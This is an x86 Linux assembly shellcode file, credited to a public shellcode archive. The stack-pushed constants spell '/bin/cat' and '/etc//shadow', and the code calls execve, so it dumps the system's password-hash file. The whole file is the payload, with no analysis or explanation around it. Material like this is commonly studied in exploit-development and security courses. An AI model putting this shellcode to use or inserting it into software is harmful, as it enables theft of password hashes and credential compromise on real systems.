; original source courtesy : http://shell-storm.org/shellcode/files/shellcode-758.php

global _start			

section .text
_start:

xor    eax,eax
push   eax
push   0x7461632f
push   0x6e69622f
mov    ebx,esp

push   eax
push   0x776f6461
push   0x68732f2f
push   0x6374652f
mov    ecx,esp

push   eax
push   ecx
push   ebx

mov    ecx,esp
mov    al,0xb
int 0x80
